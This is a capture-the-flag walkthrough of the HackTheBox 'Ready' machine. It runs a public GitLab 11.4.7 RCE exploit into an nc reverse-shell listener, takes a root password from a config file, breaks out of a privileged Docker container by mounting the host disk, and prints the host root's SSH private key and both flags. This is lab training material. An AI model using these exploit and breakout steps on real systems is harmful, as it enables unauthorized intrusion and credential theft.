# Ready - HackTheBox
Linux, 30 Base Points, Medium

## Machine

![‏‏Ready.JPG](images/‏‏Ready.JPG)
 
## Ready Solution

### User

So let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Ready]
└──╼ $nmap -sC -sV -oA nmap/Ready 10.10.10.220
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-24 23:57 IST
Nmap scan report for 10.10.10.220
Host is up (0.54s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.27 seconds

```

Let's browse to ```http://10.10.10.220:5080``` and register to Gitlab:

![port5080.JPG](images/port5080.JPG)

So after the registartion we get the following Gitlab page:

![login.JPG](images/login.JPG)

By click on profile icon (top right) -> Help we can see It's Gitlab version 11.4.7:

![help.JPG](images/help.JPG)

By searching exploit to this version we can find the following exploit [https://github.com/ctrlsam/GitLab-11.4.7-RCE](https://github.com/ctrlsam/GitLab-11.4.7-RCE), Let's try to use it:
```console
┌─[evyatar@parrot]─[/hackthebox/Ready]
└──╼ $git clone https://github.com/ctrlsam/GitLab-11.4.7-RCE
Cloning into 'GitLab-11.4.7-RCE'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 13 (delta 2), reused 11 (delta 2), pack-reused 0
Unpacking objects: 100% (13/13), 3.85 KiB | 115.00 KiB/s, done.
┌─[evyatar@parrot]─[/hackthebox/Ready]
└──╼ $cd GitLab-11.4.7-RCE/
```

Listen to port 1337 using ```nc```:
```console
┌─[evyatar@parrot]─[/hackthebox/Ready]
└──╼ $ nc -lvp 1337
listening on [any] 1337 ...
```

And run the exploit:
```console
┌─[evyatar@parrot]─[/hackthebox/Ready]
└──╼ $python3 exploit.py -u evyatar9 -p Welcome1! -g http://10.10.10.220 -l 10.10.14.13 -P 1337
[+] authenticity_token: +71zPYAzDwSy/lk+WHaf6U0YfuC4KxUPmIi/cJmnJArL1jE9AIfpQA62w1el1RMKAp61RC+/8ha6hFWhCn5b2w==
[+] Creating project with random name: project2963
[+] Running Exploit
[+] Exploit completed successfully
```

And we get shell with ```git``` user:
```console
┌─[evyatar@parrot]─[/hackthebox/Ready]
└──╼ $ nc -lvp 1337
listening on [any] 1337 ...
10.10.10.220: inverse host lookup failed: Unknown host
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.220] 43546
whoami
git
python3 -c 'import pty; pty.spawn("/bin/bash")'
git@gitlab:~/gitlab-rails/working$
```

By running [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) we can found the following password:
```json
./gitlab.rb:gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

So we have the following users:
```console
git@gitlab:~$ cat /etc/passwd | grep sh
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
dude:x:1000:1000::/home/dude:/bin/bash
```

The password above works for ```root``` user (local user - we are inside container):
```console
git@gitlab:~$ su root
su root
Password: wW59U!ZKMbG9+*#h

root@gitlab:/var/opt/gitlab#
```

And now we can get the user flag:
```console
root@gitlab:/var/opt/gitlab# ls /home
ls /home
dude
root@gitlab:/var/opt/gitlab# cat /home/dude/user.txt
cat /home/dude/user.txt
e1e30b052b6ec0670698805d745e7682
```

### Root

We need to "escape" from container, Let's try some "tricks" from (https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)[https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout]

Well configured docker containers won't allow command like ```fdisk -l```. However on missconfigured docker command where the flag ```--privileged``` is specified, it is possible to get the privileges to see the host drive, So let's try to run ```fdisk -l```:

```console
root@gitlab:/var/opt/gitlab# fdisk -l
fdisk -l
Disk /dev/loop0: 55.5 MiB, 58159104 bytes, 113592 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop1: 71.3 MiB, 74797056 bytes, 146088 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop2: 31.1 MiB, 32595968 bytes, 63664 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop3: 55.4 MiB, 58052608 bytes, 113384 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop4: 31.1 MiB, 32571392 bytes, 63616 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop5: 71.4 MiB, 74907648 bytes, 146304 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E

Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem
/dev/sda3  37746688 41940991  4194304   2G Linux swap
```

We can see the following device ```/dev/sda2      4096 37746687 37742592  18G Linux filesystem```, Let's try to mount it to get the host device:

```console
root@gitlab:/var/opt/gitlab# mount /dev/sda2 /mnt/hola
mount /dev/sda2 /mnt/hola
root@gitlab:/var/opt/gitlab# ls /mnt/hola
ls /mnt/hola
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
```

Now, we can get the root ```id_rsa```:
```console
root@gitlab:/mnt/hola# cat /mnt/hola/root/.ssh/id_rsa
cat /mnt/hola/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
```

Connect using root private key and get the root flag:

```console
┌─[evyatar@parrot]─[/hackthebox/Ready]
└──╼ $ssh -i id_rsa root@10.10.10.220
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 25 Mar 2021 12:43:08 AM UTC

  System load:                      0.11
  Usage of /:                       66.2% of 17.59GB
  Memory usage:                     82%
  Swap usage:                       1%
  Processes:                        442
  Users logged in:                  0
  IPv4 address for br-bcb73b090b3f: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.220
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:e89a

  => There are 76 zombie processes.


186 updates can be installed immediately.
89 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 11 14:28:18 2021
root@ready:~# cat root.txt
b7f98681505cd39066f67147b103c2b3
```
